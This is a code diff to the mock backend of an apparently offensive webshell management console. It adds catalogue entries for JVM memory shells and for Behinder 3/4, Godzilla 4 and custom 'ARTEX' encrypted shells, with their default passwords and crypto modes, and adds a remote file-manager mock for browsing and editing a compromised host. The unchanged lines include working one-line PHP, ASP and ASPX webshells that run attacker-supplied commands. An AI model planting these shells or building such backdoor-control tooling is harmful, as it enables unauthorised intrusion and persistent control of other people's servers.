@@ -105,9 +105,176 @@ const MOCK_WEBSHELL_TYPES: WebshellType[] = [
     code_mode: false,
     note: "ASP.NET WebForm",
   },
+  {
+    type: "jsp_memory",
+    label: "JVM 内存马（参数触发）",
+    filename: "ArtexFilter.java",
+    default_param: "pass",
+    code_mode: false,
+    note: "无马文件，驻留 Filter 读 POST 参数",
+  },
+  {
+    type: "jsp_memory_header",
+    label: "JVM 内存马（请求头触发）",
+    filename: "ArtexFilter.java",
+    default_param: "X-Token",
+    code_mode: false,
+    note: "命令走自定义请求头，GET 触发",
+  },
+  {
+    type: "behinder3_php",
+    label: "冰蝎 3 PHP",
+    filename: "shell.php",
+    default_param: "pass",
+    code_mode: false,
+    note: "连接已有冰蝎 3 PHP 马，或生成配套马；AES-CBC（零 IV）",
+    family: "behinder3",
+    language: "php",
+    param_unused: true,
+    default_secret: "rebeyond",
+  },
+  {
+    type: "behinder3_jsp",
+    label: "冰蝎 3 JSP",
+    filename: "shell.jsp",
+    default_param: "pass",
+    code_mode: false,
+    note: "AES-128-ECB",
+    family: "behinder3",
+    language: "jsp",
+    param_unused: true,
+    default_secret: "rebeyond",
+  },
+  {
+    type: "behinder3_aspx",
+    label: "冰蝎 3 ASPX",
+    filename: "shell.aspx",
+    default_param: "pass",
+    code_mode: false,
+    note: "AES-128-CBC（IV=密钥）",
+    family: "behinder3",
+    language: "aspx",
+    param_unused: true,
+    default_secret: "rebeyond",
+  },
+  {
+    type: "behinder4_php",
+    label: "冰蝎 4 PHP",
+    filename: "shell.php",
+    default_param: "pass",
+    code_mode: false,
+    note: "支持 AES / magic 尾巴 / XOR-base64；PHP 无裸 XOR 协议",
+    family: "behinder4",
+    language: "php",
+    param_unused: true,
+    cryptos: ["default_aes", "aes_with_magic", "default_xor_base64"],
+    default_crypto: "default_aes",
+    default_secret: "rebeyond",
+  },
+  {
+    type: "behinder4_jsp",
+    label: "冰蝎 4 JSP",
+    filename: "shell.jsp",
+    default_param: "pass",
+    code_mode: false,
+    note: "四种传输协议全支持，需与目标马实际使用的一致",
+    family: "behinder4",
+    language: "jsp",
+    param_unused: true,
+    cryptos: ["default_aes", "aes_with_magic", "default_xor", "default_xor_base64"],
+    default_crypto: "default_aes",
+    default_secret: "rebeyond",
+  },
+  {
+    type: "behinder4_aspx",
+    label: "冰蝎 4 ASPX",
+    filename: "shell.aspx",
+    default_param: "pass",
+    code_mode: false,
+    note: "冰蝎 4 的 ASPX 只有 AES（base64 + AES-128-ECB）",
+    family: "behinder4",
+    language: "aspx",
+    param_unused: true,
+    cryptos: ["default_aes"],
+    default_crypto: "default_aes",
+    default_secret: "rebeyond",
+  },
+  {
+    type: "godzilla4_php",
+    label: "哥斯拉 4 PHP",
+    filename: "shell.php",
+    default_param: "pass",
+    code_mode: false,
+    note: "表单字段名即 pass；密钥经 md5 取前 16 位",
+    family: "godzilla4",
+    language: "php",
+    param_unused: true,
+    default_secret: "pass",
+    default_secret_key: "key",
+  },
+  {
+    type: "godzilla4_jsp",
+    label: "哥斯拉 4 JSP",
+    filename: "shell.jsp",
+    default_param: "pass",
+    code_mode: false,
+    note: "AES-128-ECB；payload 缓存在服务端 session",
+    family: "godzilla4",
+    language: "jsp",
+    param_unused: true,
+    default_secret: "pass",
+    default_secret_key: "key",
+  },
+  {
+    type: "godzilla4_aspx",
+    label: "哥斯拉 4 ASPX / C#",
+    filename: "shell.aspx",
+    default_param: "pass",
+    code_mode: false,
+    note: "AES-128-CBC（IV=密钥）；payload 缓存在服务端 session",
+    family: "godzilla4",
+    language: "aspx",
+    param_unused: true,
+    default_secret: "pass",
+    default_secret_key: "key",
+  },
+  {
+    type: "artex_crypt_php",
+    label: "ARTEX 加密 PHP（自研）",
+    filename: "artex.php",
+    default_param: "d",
+    code_mode: false,
+    note: "AES-256-CBC + HMAC-SHA256，随机 IV、base64url、诱饵字段",
+    family: "artex_crypt",
+    language: "php",
+    default_secret: "artex",
+  },
+  {
+    type: "artex_crypt_jsp",
+    label: "ARTEX 加密 JSP（自研）",
+    filename: "artex.jsp",
+    default_param: "d",
+    code_mode: false,
+    note: "AES-256-CBC + HMAC-SHA256 信封，适合 Tomcat 8/9",
+    family: "artex_crypt",
+    language: "jsp",
+    default_secret: "artex",
+  },
+  {
+    type: "artex_crypt_aspx",
+    label: "ARTEX 加密 ASPX（自研）",
+    filename: "artex.aspx",
+    default_param: "d",
+    code_mode: false,
+    note: "AES-256-CBC + HMAC-SHA256 信封，.NET Framework 4.x 可用",
+    family: "artex_crypt",
+    language: "aspx",
+    default_secret: "artex",
+  },
 ];
 
 function mockWebshellSource(t: WebshellType, param: string): string {
+  if (t.family) return `// ${t.label}：加密马源码由后端按连接口令生成，demo 不内置。`;
   if (t.type === "php_eval") return `<?php eval($_POST["${param}"]);`;
   if (t.type === "php_assert") return `<?php assert($_POST["${param}"]);`;
   if (t.type === "php_cmd") return `<?php echo shell_exec($_POST["${param}"]);`;
@@ -116,6 +283,44 @@ function mockWebshellSource(t: WebshellType, param: string): string {
   if (t.type === "asp_exec")
     return `<% Dim s:Set s=CreateObject("Wscript.Shell")Response.Write s.Exec(Request.Form("${param}")).StdOut.Read(100000) %>`;
   return `<%@ Page Language="C#" %><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request.Form["${param}"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>`;
+}
+
+// 文件管理 mock：一个极小的内存目录树，够前端联调文件面板的交互。
+const mockFSDirs = ["/var", "/var/www", "/var/www/html", "/etc", "/tmp", "/root"];
+const mockFSFiles = new Map<string, string>([
+  ["/var/www/html/index.php", "<?php\necho 'hello artex';\n"],
+  ["/var/www/html/config.php", "<?php\nreturn ['db' => 'artex'];\n"],
+  ["/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n"],
+]);
+const mockFSModes = new Map<string, string>();
+
+// mockFSMove 处理重命名：文件直接搬，目录连同子孙一起改前缀。
+function mockFSMove(from: string, to: string) {
+  const content = mockFSFiles.get(from);
+  if (content !== undefined) {
+    mockFSFiles.delete(from);
+    mockFSFiles.set(to, content);
+    return;
+  }
+  const dirIdx = mockFSDirs.indexOf(from);
+  if (dirIdx >= 0) mockFSDirs[dirIdx] = to;
+  mockFSDirs.forEach((d, i) => {
+    if (d.startsWith(`${from}/`)) mockFSDirs[i] = to + d.slice(from.length);
+  });
+  for (const [f, c] of [...mockFSFiles.entries()]) {
+    if (f.startsWith(`${from}/`)) {
+      mockFSFiles.delete(f);
+      mockFSFiles.set(to + f.slice(from.length), c);
+    }
+  }
+}
+
+// mockFSRemove 删文件或整个目录（目录递归删子孙）。
+function mockFSRemove(p: string) {
+  mockFSFiles.delete(p);
+  const keep = mockFSDirs.filter((d) => d !== p && !d.startsWith(`${p}/`));
+  mockFSDirs.length = 0;
+  mockFSDirs.push(...keep);
 }
 
 const mockWebshells: Webshell[] = [
@@ -2400,6 +2605,9 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       shell_type: String(b.shell_type ?? "php_eval"),
       shell_label: MOCK_WEBSHELL_TYPES.find((t) => t.type === String(b.shell_type ?? "php_eval"))?.label ?? "PHP eval",
       param: String(b.param ?? "pass"),
+      crypto: String(b.crypto ?? ""),
+      secret: String(b.secret ?? ""),
+      secret_key: String(b.secret_key ?? ""),
       os_type: String(b.os_type ?? ""),
       exec_mode: String(b.exec_mode ?? "command"),
       insecure_tls: b.insecure_tls !== false,
@@ -2410,6 +2618,74 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     };
     mockWebshells.push(created);
     return created;
+  }
+  if (/^\/webshells\/\d+\/fs$/.test(path) && m === "POST") {
+    const op = String(b.op ?? "list");
+    const p = String(b.path ?? "/") || "/";
+    const dir = p.endsWith("/") ? p : `${p}/`;
+    if (op === "list") {
+      const dirs = new Set(
+        mockFSDirs.filter((d) => d !== p && d.startsWith(dir) && !d.slice(dir.length).includes("/")),
+      );
+      const files = [...mockFSFiles.entries()].filter(([f]) => f.startsWith(dir) && !f.slice(dir.length).includes("/"));
+      return {
+        ok: true,
+        os: "linux",
+        elapsed_ms: 96,
+        data: {
+          path: p,
+          parent: p === "/" ? "" : dir.slice(0, -1).replace(/\/[^/]+$/, "") || "/",
+          entries: [
+            ...[...dirs].map((d) => ({
+              name: d.slice(dir.length),
+              dir: true,
+              size: 4096,
+              mode: mockFSModes.get(d) ?? "755",
+              mtime: 1761400000,
+            })),
+            ...files.map(([f, c]) => ({
+              name: f.slice(dir.length),
+              dir: false,
+              size: c.length,
+              mode: mockFSModes.get(f) ?? "644",
+              mtime: 1761410000,
+            })),
+          ],
+        },
+      };
+    }
+    if (op === "read") {
+      const content = mockFSFiles.get(p);
+      if (content === undefined) return { ok: false, error: "文件不存在", elapsed_ms: 40 };
+      return {
+        ok: true,
+        os: "linux",
+        elapsed_ms: 40,
+        data: { path: p, size: content.length, content_b64: btoa(unescape(encodeURIComponent(content))) },
+      };
+    }
+    if (op === "write") {
+      const content = String(b.content_b64 ?? "");
+      mockFSFiles.set(p, decodeURIComponent(escape(atob(content))));
+      return { ok: true, os: "linux", elapsed_ms: 60, data: { path: p, bytes: content.length } };
+    }
+    if (op === "delete") {
+      mockFSRemove(p);
+      return { ok: true, os: "linux", elapsed_ms: 40 };
+    }
+    if (op === "mkdir") {
+      if (!mockFSDirs.includes(p)) mockFSDirs.push(p);
+      return { ok: true, os: "linux", elapsed_ms: 40, data: { path: p } };
+    }
+    if (op === "rename") {
+      mockFSMove(String(b.from ?? ""), String(b.to ?? ""));
+      return { ok: true, os: "linux", elapsed_ms: 40 };
+    }
+    if (op === "chmod") {
+      mockFSModes.set(p, String(b.mode ?? ""));
+      return { ok: true, os: "linux", elapsed_ms: 40, data: { path: p } };
+    }
+    return { ok: true, os: "linux", elapsed_ms: 40, data: { path: p } };
   }
   if (/^\/webshells\/\d+$/.test(path) && (m === "GET" || m === "PATCH")) {
     const idx = mockWebshells.findIndex((x) => String(x.id) === seg.at(-1));
